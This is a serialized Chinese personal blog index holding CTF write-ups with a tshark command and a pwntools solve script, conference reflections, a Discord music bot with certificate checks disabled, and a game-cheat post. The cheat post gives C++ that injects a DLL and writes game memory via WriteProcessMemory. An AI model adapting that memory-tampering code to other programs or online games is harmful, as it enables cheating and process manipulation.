進入資料夾後\nfile * |grep JPEP xdg-open 檔案編號 duck-pics pcap題目 查看內容猜測是跟鍵盤運作有關，先把內容dump下來，在透過\r工具解密\ntshark -r capture.pcapng -Y \u0026#39;usb.src == \u0026#34;1.1.1\u0026#34;\u0026#39; -T fields -e usbhid.data |sed \u0026#39;s/../:\u0026amp;/g2\u0026#39; \u0026gt; output python3 convert.py output 參考write up\n總結 #\r這次學到了滿多東西，一些工具的使用，還有一些之前學到的技術的實際應用\n後面看別人的wu也學了滿多東西(主要是canary的部分啦)\n然後我這次的排版我覺得有夠醜 下禮拜改進\n最後隨便放一句\n時よ止まれ、おまえは美しい\n","date":"30 September 2024","externalUrl":null,"permalink":"/posts/007_weeklyctf02/","section":"Posts","summary":"這次打的是BuckeyeCTF 2024","title":"每周CTF計畫02","type":"posts"},{"content":"\r耶其實我還有在牛肉湯讀書會發表這個\n其實滿廢的 對不起大家。\r動機 #\r這次的被害者是 SupermarketTogether\n這是一個模擬超市經營的遊戲，但這次的外掛跟這部分完全沒關係\n簡單來講在這個遊戲內有一個房間，是正常遊玩進不去，門口有空氣牆堵住\n然後房間內有一隻大象，下圖就是房間內的畫面\n總之我的目的就是要進去房間內，對就是那麼廢。\n進入房間內 #\r正常方法(? #\r一開始先去看了一下正常該如何透過遊戲內的bug卡進去房間內\n簡單來講就是透過unity其中的3D物件不斷重疊會發生穿模的bug來卡入房間內 具體如何進入的話可以查看下面這個影片的7:40的部分 https://www.bilibili.com/video/BV1XXeneoEcJ/\n透過CheatEngine #\rCheatEngine(以下簡稱CE)，是一個常用來改遊戲內參數的外掛工具，這邊不特別介紹\n參考影片的話可以看下列兩個，上面成大資安社的社課主要是介紹CE的基礎使用，下面的則是透過CE來找座標，建議搭配食用 小提醒：找座標時記得把類型改成float比較好找 那總之透過不斷搜尋後就可以找到控制x座標的部分了，接著把參數改成2.5即可進入房間內\n恭喜你也是很酷的人了 啪嘰啪嘰啪嘰\n值得一提的是，再找參數的時候有發現兩個控制座標的參數\n但其中一個改值後不會馬上生效，另一個則會\n最後推斷是，其中一個是主要控制的，另一個則有點像是附屬的感覺(?\nDLL #\r來到這次的重點了，前面單純透過CE來改參數的部分不論是速度還是什麼，缺點太多了\n因此這邊我們就來把它寫成DLL的形式，透過DLL injection來注入我們寫的壞壞的東西\n以此來達到按下特定按鍵就可以瞬移進入房間內的功能\n先丟一下github 裡面有這次的原碼及DLL Betan423/SupermarkerTogether-dll\r在B33F50UP讀書會上分享的外掛原始檔\rC\u0026#43;\u0026#43; 0\r0\r遇到問題 #\r本次遇到最大的問題是，每次開啟所佔用的的address都不同，因此也就不能單純透過一個固定修改某處address的DLL來打天下\n而我最初的想法是，會不會他只是base address不同，而其他彼此參數間的相對位置則是固定的\n如果參數間的相對距離是固定的，我們也就能透過先去尋找一個好找一點的值(像是金錢)，接著再透過他跟x座標彼此間的address差值，就能夠快速找出x座標的address了\n但在重複找了許多次金錢與x座標的address，發現他們彼此間的差值是沒有相關的qq\nmoney place 差值 12455A43E80 1222316B88C 2 328D 85F4 1CD5CB93BE0 1CB32953D08 2 2A23 FED8 1D652C40BE0 1D402B92B6C 2 500A E074 28FE89F9E80 28D82C0752C 2 65DF 2954 1AFDC3D4940 1ADA2B77B98 2 3985 CDA8 因此最後的方案就還是要先在開始時去尋找x座標的address，接著再透過輸入進去DLL內，來改變其中預設的address值(預設是寫0x0400000 但當然不可能是這邊)\nDLL說明 #\r最終DLL的步驟就是先透過讓用戶按下i來出現輸入address的對話框，接著修改後就能透過按下o來瞬移進房間內。按下l來離開房間內\n這邊可以搭配上面github內的final.cpp原始碼一起看，這邊就不特別貼整段原始碼了\n定義類型 #\r剛剛有提到我們是夠過float來改會比較方便，因此在最開頭的地方先定義好\n#define TYPE float 定義參數 #\r在上面先宣告好參數，在最後的時候給參數附值，也就是我們瞬移後要的座標是多少\nstruct Params { TYPE x_go; // 位置 TYPE y_go; TYPE x_back; TYPE y_back; }; ... g_params.x_go = 2.5f; g_params.y_go = 2.8f; g_params.x_back = 2.0f; g_params.y_back = 2.8f; 取得地址 #\r會跳出兩個對話框，一個是讓你輸入address的，一開始會顯示請輸入新的記憶體位址（十六進位）；另一個則是單純確認框，輸入好後按下去即可修改\nDWORD_PTR GetUserInputAddress() { //輸入部分 HWND hwndInput = CreateWindowEx( 0, L\u0026#34;EDIT\u0026#34;, NULL, WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_VISIBLE | ES_LEFT, CW_USEDEFAULT, CW_USEDEFAULT, 300, 100, NULL, NULL, GetModuleHandle(NULL), NULL ); SetWindowText(hwndInput, L\u0026#34;請輸入新的記憶體位址（十六進位）\u0026#34;); ShowWindow(hwndInput, SW_SHOW); UpdateWindow(hwndInput); char input[17] = { 0 }; // 確認部分 if (MessageBox(NULL, L\u0026#34;請輸入新的記憶體位址（十六進位）並按下確認\u0026#34;, L\u0026#34;輸入地址\u0026#34;, MB_OKCANCEL) == IDOK) { GetWindowTextA(hwndInput, input, sizeof(input)); DestroyWindow(hwndInput); return strtoull(input, NULL, 16); // 將輸入的十六進位字符串轉換為地址 } // 出錯返回原地址 DestroyWindow(hwndInput); return g_x_address; } 修改參數 #\r這邊就是結合上面兩個定義好的address以及先前設定的參數來修改內存的值了\nif (GetAsyncKeyState(\u0026#39;O\u0026#39;) \u0026amp; 0x8000) // 0x8000 表示該鍵被按下 { WriteProcessMemory(hProcess, (LPVOID)(g_x_address), \u0026amp;g_params.x_go, sizeof(TYPE), NULL); WriteProcessMemory(hProcess, (LPVOID)(g_x_address - 0x10), \u0026amp;g_params.y_go, sizeof(TYPE), NULL); } if (GetAsyncKeyState(\u0026#39;L\u0026#39;) \u0026amp; 0x8000) // 0x8000 表示該鍵被按下 { WriteProcessMemory(hProcess, (LPVOID)(g_x_address), \u0026amp;g_params.x_back, sizeof(TYPE), NULL); WriteProcessMemory(hProcess, (LPVOID)(g_x_address - 0x10), \u0026amp;g_params.y_back, sizeof(TYPE), NULL); } 總結 #\r耶大概就這樣，DLL外掛的衍伸應用還有很多，絕對不會只有單純這樣改參數這麼簡單，但窩不會，像是也可以透過掛個hook之類的來修改原本的運作方法\u0026hellip; 以後如果學到的話會再來寫布拉格的 大概\n","date":"26 September 2024","externalUrl":null,"permalink":"/posts/006_supermarketdll/","section":"Posts","summary":"把CE改參數部分寫成dll來注入","title":"超市一起瞬移DLL","type":"posts"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/%E8%B3%87%E5%AE%89/","section":"Tags","summary":"","title":"資安","type":"tags"},{"content":"","date":"26 September 2024","externalUrl":null,"permalink":"/tags/%E9%81%8A%E6%88%B2%E5%A4%96%E6%8E%9B/","section":"Tags","summary":"","title":"遊戲外掛","type":"tags"},{"content":"\r假裝自己在參加鐵人賽\r前言 #\r這次參加的是 IERAE CTF ，其實本來是有報名三場CTF的，但最後只有這場解出比較多題(但也沒多少)，所以就專注寫這個了\n之後的步調應該也都會差不多是這樣，先報名2~3個CTF，最後再看要主打哥哪個\n本次排名 106/224 解出四題qq\n題目 #\rWelcome #\rflag在DC內，就單純進去找 :)\nOMG #\r類型: web\n一個網頁，然後只要按返回前一頁33次就可以了\nderangement #\r類型: crypto\n有一個隨機產生的16個字符，然後裡面會不斷隨機排列他們的順序，目標是找出正確的順序\n查看加密法後會發現字符不會出現在本來正確的地方，因此只要多跑幾次就可以順利得出本來的順序了\n本來是想硬搓的，但想說這樣沒甚麼用還是透過pwntool寫好了\nfrom pwn import * # 開啟程序 p = remote(\u0026#39;104.199.135.28\u0026#39;, 55555) # 用來存儲所有獲得的提示 hints = [] ans=\u0026#39;\u0026#39; p.sendlineafter(\u0026#34;\u0026gt; \u0026#34;,\u0026#39;1\u0026#39;) response = p.recvuntil(\u0026#39;hint: \u0026#39;).decode() world = p.recvline().decode().strip() a = world b = world c = world d = world e = world f = world g = world h = world i = world j = world k = world l = world m = world n = world o = world time =0 try: while time\u0026lt;100: # 發送 \u0026#34;1\u0026#34; 來獲取提示 p.sendline(\u0026#39;1\u0026#39;) # 接收並解析提示 response = p.recvuntil(\u0026#39;hint: \u0026#39;).decode() hint = p.recvline().decode().strip() hints.append(hint) print(f\u0026#39;Received hint: {hint}\u0026#39;) # 可以在這裡添加邏輯來分析 hints 並推測原始魔法詞 if hint[0] in a: a = a.replace(hint[0], \u0026#34;\u0026#34;) if hint[1] in b: b = b.replace(hint[1], \u0026#34;\u0026#34;) if hint[2] in c: c = c.replace(hint[2], \u0026#34;\u0026#34;) if hint[3] in d: d = d.replace(hint[3], \u0026#34;\u0026#34;) if hint[4] in e: e = e.replace(hint[4], \u0026#34;\u0026#34;) if hint[5] in f: f = f.replace(hint[5], \u0026#34;\u0026#34;) if hint[6] in g: g = g.replace(hint[6], \u0026#34;\u0026#34;) if hint[7] in h: h = h.replace(hint[7], \u0026#34;\u0026#34;) if hint[8] in i: i = i.replace(hint[8], \u0026#34;\u0026#34;) if hint[9] in j: j = j.replace(hint[9], \u0026#34;\u0026#34;) if hint[10] in k: k = k.replace(hint[10], \u0026#34;\u0026#34;) if hint[11] in l: l = l.replace(hint[11], \u0026#34;\u0026#34;) if hint[12] in m: m = m.replace(hint[12], \u0026#34;\u0026#34;) if hint[13] in n: n = n.replace(hint[13], \u0026#34;\u0026#34;) if hint[14] in o: o = o.replace(hint[14], \u0026#34;\u0026#34;) ans=a+b+c+d+e+f+g+h+i+j+k+l+m+n+o print(ans) if(len(ans)==15): p.sendline(\u0026#39;2\u0026#39;) p.sendline(ans) p.interactive() except Exception as e: print(f\u0026#39;Connection closed or error occurred: {e}\u0026#39;) finally: p.close() Assignment #\r類型: rev\n透過IDA打開可以看到順序被打亂的flag\n但打開F5後就可以看到排列好順序的flag了 總結 #\r這次其實都只有解出水題出來w\n但畢竟才第一周\n其實我也不知道這樣會不會有效果 但就先嘗試看看\n之後會再補充一些自己沒解出來的題目，但是去查看別人wu解出來的內容\n最後分享一個這次在比賽結束後看到的\n在講這次比賽crypto類型的題目，頻道內容也有其他資安相關的影片\n不過是日文的VT\n","date":"23 September 2024","externalUrl":null,"permalink":"/posts/005_weeklyctf01/","section":"Posts","summary":"你說的對但這就是CTF","title":"每周CTF計畫01","type":"posts"},{"content":"\r今年是我第一次參加HITCON，而我有幸能順利錄取學生免費方案，這邊再次感謝HITCON官方\r感想 #\r這邊先改一下順序，先講一下這次活動的感想，對於本活動有興趣的話可以再去閱讀下面的相關介紹\n這次的badge電路板、各種的攤位活動也都很有趣，議程也是有讓我了解了許多新東西，而且免費早餐跟點心也很都好吃👉👈 因為自己這次主要是有在協助NISRA擺攤，因此其實這次主要是待在社群攤位，中間也有去聽了幾場自己感興趣的議程 這次活動讓我收穫許多，無論是badge的遊戲闖關、各種攤位活動、相關議程等，都讓我認識了許多全新的人，已經學習到了許多自己以前從未接觸過的方面\n我認為HITCON CMT是十分適合不論你是剛入門資安，又或是已經對於資安有一定的了解都可以來參加\n資安新手 #\r對於剛入門的人來講，在這邊能夠去聽一些自己有興趣的議程，了解該方面的未來發展、相關技術等，又或是可以到處認識一堆大佬，結交一些新朋友，讓你在資安的道路上不孤獨，畢竟會來HITCON的人或多或少都是對於資安有興趣的人，建議大家不要害羞，可以勇敢一點去多跟不論是社群攤位的社團、贊助商攤位，又或是你想在路上隨機搭訕路人也不是不行 (X\n資安老手 #\r而對於已經有一定程度的人來講，也能去多聽一些較為技術面向的議程，更重要的是如果平常有在打CTF的話，可以在現場看到一堆平常比賽時會遇到的賽棍\n也可以多去跟社群攤位聊一聊，或是參與他們的攤位活動，攤位的活動是比較技術取向的，也可以去激進自己的能力看看\n又或是要跟他們直接面試應該也不是不行\nHITCON #\r這邊先簡單介紹一下HITCON是甚麼 HITCON aka 台灣駭客年會 Hacks In Taiwan Conference\n今年(2024)為HITCON舉辦的第20周年(啪機啪機啪機)\n而HITCON活動內容我認為主要可以分成下列三個部分\n分別是 議程、社群攤位、贊助商攤位\n社群攤位 #\r社群攤位裡面主要是各校社團、資安相關社群等\n像是就有HITCON GIRLS、成大資安社(B33F 50UP戰隊)、中電會\u0026hellip;　當然還有我這次有幫忙的NISRA攤位 雖然我也在B33F 50UP戰隊就是了\n其實滿建議大家沒事就可以多來這邊跟各大社群做交流，如果你還是高中生的話，可以前往中電會與他們稍作交流，而如果你是大學生也可以去到TSC的攤位去做一些了解之類的\n當然也很歡迎去其他各大攤位去了解他們在幹嘛，我自己是滿開心如果有人來我們攤位的啦，相信其他攤位基本上也都是這樣，因此也建議大家不要害羞，盡量去多多與大家交流，而且還可以拿很多攤位的酷酷獎品(X\n贊助商攤位 #\r這邊主要是各大有贊助的廠商能夠來到這邊擺攤、介紹他們的公司，攤位也會有一些小活動，像是DEVCORE的套圈圈之類的。\n也能向各大攤位詢問一些他們公司的事項、或是你好奇的東西之類的\n其實基本上與社群攤位滿像的 只是變成是由公司擺攤\n議程 #\r這次去聽了很多場議程，而許多議程都不是用中文在講，但大家可以放心，現場都有開放同步口譯，因此也不用害怕自己聽不懂，反而還可以去接觸到平常很難有機會聽到的外文議程，也還可以多多訓練自己的外語聆聽能力(X\n但這邊主要介紹兩場印象比較深刻的議程，分別是Evasive attacks against AI-powered antivirus software - Yu Arai 、 Background of those glitches in Zelda BoTW \u0026amp; ToTK - Yuda\nEvasive attacks against AI-powered antivirus software - Yu Arai #\r這場議程主要是在介紹，他是如何bypass掉現在市面上現有的使用AI與傳統檢測技術的防毒軟體，以及最後也帶我們去思考了一下，會想繞過防毒是未來一定會面對到的議題，也因此該如何避免他們去繞過防毒也是一個很好也很重要的重點。\n而其實印象深刻的點主要有兩點，第一點是因為這場是日文的議程，本來以為自己可以不用靠翻譯就聽懂， 結果發現自己聽得懂的日文也就只有動漫那幾句\n而第二點其實是因為我今年AIS3專題做的部分也有點類似是在去靜態分析惡意軟體，因此發現自己做的類似的東西居然就這樣被bypass掉了，也有點震驚\nBackground of those glitches in Zelda BoTW \u0026amp; ToTK - Yuda #\r這場是請到有在youtube拍攝影片的Yuda來做講師，而本場議程主要是在介紹說他們在遊戲中是如果去挖掘、發現一些獨特的漏洞(GLITCH)，以及一些相關經驗分享等\n我認為這是一場很特別很酷的議程，他並非像是傳統常見的議程，他反而沒有特別介紹許多技術相關的內容，但是我覺得其中挖掘漏洞所需要的思考及創新結合，是資安人會滿需要具備的能力，就是能跳脫傳統思考的樣子，總之是場很棒的議程\n","date":"27 August 2024","externalUrl":null,"permalink":"/posts/004_2024hitcon/","section":"Posts","summary":"2024 HITCON心得","title":"2024 HITCON心得","type":"posts"},{"content":"\rAIS3 a.k.a. 大型網友見面會\n好好玩 明年還去\r前言 #\r這是我第一次參加AIS3 結果就不小心被我蹭到最佳專題獎了\n在這邊再次感謝小蔡、萊姆跟l3obo三位隊友的凱瑞\n專題 #\r主題發想 #\r我這次是選到情資運用及防護，組別為B8\n當初完全就是被這個看起來很酷的名子騙進來的，完全不知道這個在幹嘛 這也就導致我們專題主題想到了第二天才勉強定案，然後這邊要再跟我的組員道歉一次\n因為其實我一直想做有關惡意軟體的製作跟分析之類的，所以我算是有點堅持(?)的一直不放棄這個主題，結果最後也真的被我盧成功了\n最後的主題就是基於聚類分析技術的惡意程式變體辨識方法研究\n感謝勝舢助教協助主題發想🛐\n製作過程 #\r我負責的部分算是進行資料的前處理以及資料的後續消化分析\n所以後面他們在做分析的時候我的工作內容就變成了問有沒有人要吃起司\n報告 #\r我們大概是最後一天下午才開始慢慢做簡報的，我只能跟大家說\n完 全 做 不 完\n因為其實我對做簡報也沒有到很熟，加上對主題也有點迷茫，因此其實改了很多次\n然後重要的一件事一定要試報，而且我是覺得需要不只一次\n其實我在真的試報以後才發現自己在時間的掌握、說話的結構上都還有很多很多的問題，所以後面就是開始瘋狂審稿加一直練習報自己的部分\n那個時候突然在想，我怎麼把報告報到跟在跑speedrun一樣 一直在瘋狂壓時間 這邊也謝謝三角蛇跟pwn2ooown兩位助教有聽我們試報\n但結果最後報告時間還是沒捏好，大概多講了40秒以上;(\n我給自己報告的分數大概只有6/10\n總結 #\r我覺得AIS3其實滿適合像我這種，剛接觸有點概念了，但還是不太確定未來具體方向的人\n像我這種人來了AIS3就是兩個結果，一是確認自己未來方向；二是放棄資安\n本來是差點變成二了 但最佳專題獎讓我決定做資安這塊做到死了\n然後真的建議大家要住宿，晚上跟組員討論專題也是精華之一，我就有看到一組他們有組員沒住宿 我根本沒看過他們第四個組員\n又卷 #\rAIS3到底卷不卷，來這裡到底會不會爆肝？ 卷，卷死了。拜託大家不要再卷了\u0026hellip;\n累死 #\r其實我覺得來AIS3會不會爆肝是要看個人欸\n看你追求什麼吧，如果目標是最佳專題的話當然是會很累\n但如果你只是想要來學習知識跟找到方向的話其實是可以不用那麼累的，但當然要跟自己專題的組員好好協調、溝通好\n不過都來了那目標當然是要放在最佳專題上吧\n廢話時間 #\r本來剛報告完是滿絕望的 我覺得自己講得很爛 而且時間也沒抓好 所以絕望之下就有了下面這張\n結果最後還真的拿到了\n寫共筆真的很好玩，雖然感覺大家都只是把講師的報告打上去而已\n在下面註釋的地方聊天真的很好玩\n","date":"6 August 2024","externalUrl":null,"permalink":"/posts/003_2024ais3/","section":"Posts","summary":"AIS3 讚  我是好駭客","title":"2024 AIS3心得","type":"posts"},{"content":"","date":"6 August 2024","externalUrl":null,"permalink":"/tags/code/","section":"Tags","summary":"","title":"Code","type":"tags"},{"content":"\r因為最近dc很多音樂機器人都壞掉\n一氣之下就直接透過chatGPT寫一個出來了\r前言 #\r其實真的沒啥技術含量，因為代碼真的都是叫GPT幫我搓出來的\n但還是想說丟上來好了，畢竟在自己本地架機器人就不用看其他人的臉色了 (X 基本上會從頭開始講如何建立，但有些我沒碰到的功能就不會特別介紹\n因為我自己也不懂\n想抄代碼的可以直接跳到那邊就好了\n但還是放一下跟GPT溝通的流程之類的 水一下內容\n建立DC機器人 #\r首先先到\rDiscord Developer Portal 建立一個機器人出來\n登入後左上角New Application點下去，再取個名子，專屬你ㄉ機器人就誕生了\nNew Application\r剛進去就可以先看到設定的介面，這邊基本上就是可以設定機器人的名稱、頭貼、還有點進機器人會看到的描述\n然後DESCRIPTION的部分會在 關於我 的部分顯示 取得token #\r接著到旁邊選單選擇Bot\n在這邊可以額外設定機器人的橫幅(BANNER)\n而我們這邊主要要取得機器人的TOKEN\n點下去Reset Token確認後取得全新的token先自己記起來\n切記不要外洩 因為有token就能夠執行你的機器人了\nReset Token\r接著滑到下面Privileged Gateway Intents的部分，接著把三個選項都打勾\n這邊主要是要讓機器人能夠接收指令與用戶互動\n邀進伺服器 #\r進入OAuth2的部分，滑到最下面的OAuth2 URL Generator\n主要勾選bot就好\n而下面的BOT PERMISSIONS則是勾選Administrator\n直接拿所有權限就不用再慢慢設定了\nbot\rAdministrator\r再來往下看就可以在 GENERATED URL 看到你機器人的邀請連接了\n基本上機器人的部分就到這邊了 再來就是要寫code的部分了\n代碼 #\r安裝所需的庫 #\r打開你的cmd 一起快樂安裝\npip install discord.py youtube_dl pip install yt-dlp ffmpeg安裝 #\r前往\rBtbN FFmpeg Releases下載 ffmpeg-master-latest-win64-gpl.zip\n解壓縮後丟到一個不太會動到的地方\n接著打開環境變數，win11打開環境變數的方法如下\n設定 系統 系統資訊 進階系統設定 再來就能看到環境變數了\n接著選擇Path然後編輯，新增你剛剛解壓縮下來的檔案中bin資料夾的位置 (C:\\ffmpeg\\bin) 這樣就順利安裝完成了，可以檢查看看有沒有順利安裝，沒有的話就重開機看看\nffmpeg -version bot.py #\r主要可以分兩種撥放方式\n1.線上串流(較不穩定)\n2.下載到本機(很穩定)\n線上串流 #\r先講第一種線上串流的部分\n穩定性的部分就真的很爛 大概每首歌都撥不完 大概撥個一兩分鐘左右而已\nimport discord from discord.ext import commands import yt_dlp as youtube_dl import asyncio intents = discord.Intents.default() intents.message_content = True intents.voice_states = True bot = commands.Bot(command_prefix=\u0026#39;\u0026amp;\u0026#39;, intents=intents) ytdl_format_options = { \u0026#39;format\u0026#39;: \u0026#39;bestaudio/best\u0026#39;, \u0026#39;outtmpl\u0026#39;: \u0026#39;%(extractor)s-%(id)s-%(title)s.%(ext)s\u0026#39;, \u0026#39;restrictfilenames\u0026#39;: True, \u0026#39;noplaylist\u0026#39;: True, \u0026#39;nocheckcertificate\u0026#39;: True, \u0026#39;ignoreerrors\u0026#39;: False, \u0026#39;logtostderr\u0026#39;: False, \u0026#39;quiet\u0026#39;: True, \u0026#39;no_warnings\u0026#39;: True, \u0026#39;default_search\u0026#39;: \u0026#39;auto\u0026#39;, \u0026#39;source_address\u0026#39;: \u0026#39;0.0.0.0\u0026#39; } ffmpeg_options = { \u0026#39;options\u0026#39;: \u0026#39;-vn\u0026#39; } ytdl = youtube_dl.YoutubeDL(ytdl_format_options) class YTDLSource(discord.PCMVolumeTransformer): def __init__(self, source, *, data, volume=0.5): super().__init__(source, volume) self.data = data self.title = data.get(\u0026#39;title\u0026#39;) self.url = data.get(\u0026#39;url\u0026#39;) @classmethod async def from_url(cls, url, *, loop=None, stream=False): loop = loop or asyncio.get_event_loop() data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream)) if \u0026#39;entries\u0026#39; in data: data = data[\u0026#39;entries\u0026#39;][0] filename = data[\u0026#39;url\u0026#39;] if stream else ytdl.prepare_filename(data) return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data) queue = asyncio.Queue() queue_urls = [] current_player = None # 用於儲存當前播放的音樂 @bot.event async def on_ready(): print(f\u0026#39;Logged in as {bot.user}\u0026#39;) @bot.command() async def p(ctx, url): if not ctx.message.author.voice: await ctx.send(f\u0026#34;{ctx.message.author.name} is not connected to a voice channel\u0026#34;) return channel = ctx.message.author.voice.channel if ctx.voice_client is None: voice_client = await channel.connect() else: voice_client = ctx.voice_client # Queue the song await queue.put(url) queue_urls.append(url) if not voice_client.is_playing(): await play_next_song(ctx, voice_client) @bot.command() async def leave(ctx): if ctx.voice_client: await ctx.guild.voice_client.disconnect() @bot.command() async def q(ctx): if queue_urls: queue_list = \u0026#34;\\n\u0026#34;.join([f\u0026#34;{i+1}. {url}\u0026#34; for i, url in enumerate(queue_urls)]) await ctx.send(f\u0026#34;Current queue:\\n{queue_list}\u0026#34;) else: await ctx.send(\u0026#34;The queue is currently empty.\u0026#34;) @bot.command() async def s(ctx): if ctx.voice_client and ctx.voice_client.is_playing(): ctx.voice_client.stop() await ctx.send(\u0026#39;Skipped the current song.\u0026#39;) # Optionally, automatically play the next song if not queue.empty(): await play_next_song(ctx, ctx.voice_client) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) async def play_next_song(ctx, voice_client): global current_player if not queue.empty(): url = await queue.get() queue_urls.pop(0) async with ctx.typing(): try: player = await YTDLSource.from_url(url, loop=bot.loop, stream=True) current_player = player voice_client.play(player, after=lambda e: asyncio.run_coroutine_threadsafe(play_next_song(ctx, voice_client), bot.loop)) await ctx.send(f\u0026#39;正在撥放: {player.title}\u0026#39;) except Exception as e: await ctx.send(\u0026#39;error:\u0026#39;) print(e) else: await ctx.send(\u0026#39;no song\u0026#39;) bot.run(\u0026#39;你的token\u0026#39;) 反正就又卡又容易斷掉 不如乖乖下載下來\n下載到本地 #\r因為是現在還有在用ㄉ，所以加了一些功能\n基本上就自己看一下code就能知道具體功能了 這邊就不多講了 然後下載到本地的話也不是全部下載，我是設定成一次本地只會有一首歌而已，然後撥下一首的時候就把前面的刪掉，所以不用怕自己電腦被灌爆 \u0026gt;.0\nimport discord from discord.ext import commands import yt_dlp as youtube_dl import asyncio import os import datetime intents = discord.Intents.default() intents.message_content = True intents.voice_states = True bot = commands.Bot(command_prefix=\u0026#39;\u0026amp;\u0026#39;, intents=intents) ytdl_format_options = { \u0026#39;format\u0026#39;: \u0026#39;bestaudio/best\u0026#39;, \u0026#39;outtmpl\u0026#39;: \u0026#39;%(extractor)s-%(id)s-%(title)s.%(ext)s\u0026#39;, \u0026#39;restrictfilenames\u0026#39;: True, \u0026#39;noplaylist\u0026#39;: True, \u0026#39;nocheckcertificate\u0026#39;: True, \u0026#39;ignoreerrors\u0026#39;: False, \u0026#39;logtostderr\u0026#39;: False, \u0026#39;quiet\u0026#39;: True, \u0026#39;no_warnings\u0026#39;: True, \u0026#39;default_search\u0026#39;: \u0026#39;auto\u0026#39;, \u0026#39;source_address\u0026#39;: \u0026#39;0.0.0.0\u0026#39; } ffmpeg_options = { \u0026#39;options\u0026#39;: \u0026#39;-vn\u0026#39; } ytdl = youtube_dl.YoutubeDL(ytdl_format_options) class YTDLSource(discord.PCMVolumeTransformer): def __init__(self, source, *, data, volume=0.5): super().__init__(source, volume) self.data = data self.title = data.get(\u0026#39;title\u0026#39;) self.url = data.get(\u0026#39;url\u0026#39;) self.duration = data.get(\u0026#39;duration\u0026#39;) @classmethod async def from_url(cls, url, *, loop=None, stream=False): loop = loop or asyncio.get_event_loop() data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream)) if \u0026#39;entries\u0026#39; in data: data = data[\u0026#39;entries\u0026#39;][0] filename = data[\u0026#39;url\u0026#39;] if stream else ytdl.prepare_filename(data) return cls(discord.FFmpegPCMAudio(filename, **ffmpeg_options), data=data), filename queue = asyncio.Queue() queue_urls = [] current_player = None start_time = None downloaded_file = None # Only one file will be downloaded at a time @bot.event async def on_ready(): print(f\u0026#39;Logged in as {bot.user}\u0026#39;) @bot.command() async def p(ctx, url): if not ctx.message.author.voice: await ctx.send(f\u0026#34;{ctx.message.author.name} is not connected to a voice channel\u0026#34;) return channel = ctx.message.author.voice.channel if ctx.voice_client is None: voice_client = await channel.connect() else: voice_client = ctx.voice_client # Add the song to the queue await queue.put(url) queue_urls.append(url) # Get the song title to display the added message data = ytdl.extract_info(url, download=False) title = data.get(\u0026#39;title\u0026#39;, \u0026#39;Unknown title\u0026#39;) await ctx.send(f\u0026#34;已將 {title} 加入待撥清單\u0026#34;) if not voice_client.is_playing(): await play_next_song(ctx, voice_client) @bot.command() async def leave(ctx): if ctx.voice_client: await ctx.guild.voice_client.disconnect() @bot.command() async def q(ctx): if queue_urls: queue_list = [] for url in queue_urls: data = ytdl.extract_info(url, download=False) title = data.get(\u0026#39;title\u0026#39;, \u0026#39;Unknown title\u0026#39;) queue_list.append(title) queue_msg = \u0026#34;\\n\u0026#34;.join([f\u0026#34;{i+1}. {title}\u0026#34; for i, title in enumerate(queue_list)]) await ctx.send(f\u0026#34;Current queue:\\n{queue_msg}\u0026#34;) else: await ctx.send(\u0026#34;The queue is currently empty.\u0026#34;) @bot.command() async def s(ctx): if ctx.voice_client and ctx.voice_client.is_playing(): ctx.voice_client.stop() await ctx.send(\u0026#39;Skipped the current song.\u0026#39;) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) @bot.command() async def nowplay(ctx): if current_player: elapsed = (datetime.datetime.now() - start_time).total_seconds() elapsed_str = str(datetime.timedelta(seconds=int(elapsed))) duration_str = str(datetime.timedelta(seconds=int(current_player.duration))) progress_bar = create_progress_bar(elapsed, current_player.duration) await ctx.send(f\u0026#34;Now playing: {current_player.title}\\n{elapsed_str} {progress_bar} {duration_str}\u0026#34;) else: await ctx.send(\u0026#34;No song is currently playing.\u0026#34;) def create_progress_bar(elapsed, duration, bar_length=20): progress = elapsed / duration bar = \u0026#39;-\u0026#39; * bar_length pos = int(bar_length * progress) progress_bar = bar[:pos] + \u0026#39;o\u0026#39; + bar[pos+1:] return progress_bar @bot.command() async def stop(ctx): if ctx.voice_client: if ctx.voice_client.is_playing(): ctx.voice_client.pause() await ctx.send(\u0026#39;已暫停播放.\u0026#39;) elif ctx.voice_client.is_paused(): ctx.voice_client.resume() await ctx.send(\u0026#39;已繼續播放.\u0026#39;) else: await ctx.send(\u0026#39;沒在播歌\u0026#39;) else: await ctx.send(\u0026#39;沒在語音中\u0026#39;) async def play_next_song(ctx, voice_client): global current_player, start_time, downloaded_file if not queue.empty(): url = await queue.get() queue_urls.pop(0) async with ctx.typing(): try: # Delete the previous downloaded file if it exists if downloaded_file and os.path.isfile(downloaded_file): os.remove(downloaded_file) player, filename = await YTDLSource.from_url(url, loop=bot.loop, stream=False) current_player = player start_time = datetime.datetime.now() downloaded_file = filename # Update the downloaded file voice_client.play(player, after=lambda e: asyncio.run_coroutine_threadsafe(play_next_song(ctx, voice_client), bot.loop)) await ctx.send(f\u0026#39;正在播放: {player.title}\u0026#39;) except Exception as e: await ctx.send(\u0026#39;error:\u0026#39;) print(e) else: await ctx.send(\u0026#39;no song.\u0026#39;) bot.run(\u0026#39;你ㄉtoken\u0026#39;) # 替換為你的實際 Bot Token 運行方法 #\r其實就只要運行py檔案就好了\n看你是要在cmd中執行還是直接在編譯器(我是用vs)跑都可以\npython bot.py 與chatGPT交流 #\r夢ㄉ開始 不知道為甚麼chatGPT一開始都是用java寫的，可能因為其實普遍都是用java寫吧，但我看不懂java所以都叫他寫python(\n其實好像也沒有甚麼特別要講的，基本上就都是想要什麼功能就講甚麼\n我覺得比較好玩的大概有nowplay功能而已 就是跟他說\u0026mdash;\u0026ndash;o\u0026mdash;-來表達進度條\n大概就這樣，有甚麼問題不要DM我，去問chatGPT這都他寫的(X\n","date":"6 August 2024","externalUrl":null,"permalink":"/posts/002_discordbot/","section":"Posts","summary":"謝謝ChatGPT讓我打遊戲的時候有歌可以聽","title":"DC音樂機器人製作","type":"posts"},{"content":"","date":"6 August 2024","externalUrl":null,"permalink":"/tags/%E5%85%B6%E5%AE%83/","section":"Tags","summary":"","title":"其它","type":"tags"},{"content":"\r其實pre-exam也寫在這裡了 因為兩個沒差多少\r前言 